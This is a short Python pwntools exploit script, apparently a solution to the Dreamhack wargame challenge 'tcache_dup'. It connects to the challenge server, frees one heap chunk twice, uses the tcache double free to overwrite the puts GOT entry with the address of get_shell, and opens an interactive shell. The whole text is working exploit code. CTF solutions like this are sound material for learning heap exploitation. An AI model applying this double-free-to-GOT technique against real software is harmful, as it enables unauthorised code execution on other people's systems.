from pwn import *

p = remote("host3.dreamhack.games", 12030)
e = ELF("./tcache_dup")


def create(size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)


def delete(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())


get_shell = e.sym["get_shell"]
puts_got = e.got["puts"]

create(0x10, b"a")
delete(0)
delete(0)

create(0x10, p64(puts_got))
create(0x10, "a" * 8)
create(0x10, p64(get_shell))

p.interactive()
